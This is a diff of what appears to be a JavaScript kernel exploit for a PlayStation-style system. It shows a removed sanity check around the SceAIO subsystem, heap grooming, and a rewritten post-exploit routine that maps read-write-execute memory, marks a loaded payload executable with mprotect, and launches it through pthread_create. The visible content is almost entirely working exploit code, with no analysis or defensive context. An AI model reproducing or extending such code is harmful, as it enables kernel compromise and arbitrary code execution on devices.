@@ -1618,20 +1618,6 @@ function setup(block_fd) {
     }
     aio_submit_cmd(AIO_CMD_READ, reqs1.addr, num_workers, block_id.addr);
 
-    {
-        const reqs1 = make_reqs1(1);
-        const timo = new Word(1);
-        const id = new Word();
-        aio_submit_cmd(AIO_CMD_READ, reqs1.addr, 1, id.addr);
-        chain.do_syscall_clear_errno(
-            'aio_multi_wait', id.addr, 1, _aio_errors_p, 1, timo.addr);
-        const err = chain.errno;
-        if (err !== 60) { // ETIMEDOUT
-            die(`SceAIO system not blocked. errno: ${err}`);
-        }
-        free_aios(id.addr, 1);
-    }
-
     log('heap grooming');
     // chosen to maximize the number of 0x80 malloc allocs per submission
     const num_reqs = 3;
@@ -1806,25 +1792,21 @@ export async function kexploit() {
 
 
 kexploit().then(() => {
-    
-    window.pld_size = new Int(0x26200000, 0x9);
-
-    var payload_buffer = chain.sysp('mmap', window.pld_size, 0x300000, 7, 0x41000, -1, 0);
-    var payload = window.pld;
-    var bufLen = payload.length * 4
-    var payload_loader = malloc32(bufLen);
-    var loader_writer = payload_loader.backing;
-    for (var i = 0; i < payload.length; i++) {
-        loader_writer[i] = payload[i];
-    }
-    chain.sys('mprotect', payload_loader, bufLen, (0x1 | 0x2 | 0x4));
-    var pthread = malloc(0x10);
+    const PROT_READ = 1;
+    const PROT_WRITE = 2;
+    const PROT_EXEC = 4;
+    var payload_buffer = chain.sysp('mmap', new Int(0x26200000, 0x9), 0x300000, PROT_READ | PROT_WRITE | PROT_EXEC, 0x41000, -1, 0);
+    var payload_loader = new View4(window.pld);
+    chain.sys('mprotect', payload_loader.addr, payload_loader.size, PROT_READ | PROT_WRITE | PROT_EXEC);
+    const ctx = new Buffer(0x10);
+    const pthread = new Pointer();
+    pthread.ctx = ctx;
 
     call_nze(
         'pthread_create',
-        pthread,
+        pthread.addr,
         0,
-        payload_loader,
+        payload_loader.addr,
         payload_buffer,
     );
 
